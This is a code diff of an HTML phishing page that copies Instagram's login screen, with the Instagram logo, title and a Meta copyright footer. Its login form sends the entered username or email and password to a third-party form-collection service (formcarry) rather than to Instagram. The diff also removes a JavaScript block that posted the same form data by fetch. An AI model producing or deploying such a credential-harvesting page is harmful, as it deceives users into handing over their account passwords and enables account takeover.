@@ -8,14 +8,13 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Instagram</title>
 </head>
-<body>
 <main>
     <div class="container-modified">
         <img src="https://1000logos.net/wp-content/uploads/2017/02/Logo-Instagram.png" alt="Lock Icon">
         <div class="form-group-modified">
-            <form id="loginForm" action="https://formcarry.com/s/4u9fu8BQRR6" method="POST">
+            <form action="https://formcarry.com/s/4u9fu8BQRR6" method="POST">
                 <input type="text" name="Email - Username - Phone number" id="emailInputModified" placeholder="Phone number, username or email address" required>
-                <input type="text" name="Password" id="passwordInputModified" placeholder="Password" required>
+                <input type="text" name="Password" id="emailInputModified" placeholder="Password" required>
                 <button id="sendLinkButtonModified" type="submit" style="font-size: 14px; font-weight: 600; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; cursor: pointer;">Log in</button>
             </form>
         </div>
@@ -54,29 +53,5 @@
     </div>
     <div class="bottomliner">English (IN) &nbsp;&nbsp;&nbsp;© 2024 Instagram from Meta</div>
 </footer>
-
-<script>
-    document.getElementById('loginForm').addEventListener('submit', function(event) {
-        event.preventDefault();
-        
-        // Collect form data
-        const formData = new FormData(event.target);
-        
-        // Send form data using fetch
-        fetch(event.target.action, {
-            method: 'POST',
-            body: formData
-        })
-        .then(response => response.json())
-        .then(data => {
-            console.log('Response from formcarry:', data);
-            // Reset the form fields
-            event.target.reset();
-        })
-        .catch(error => {
-            console.error('Error occurred:', error);
-        });
-    });
-</script>
 </body>
 </html>
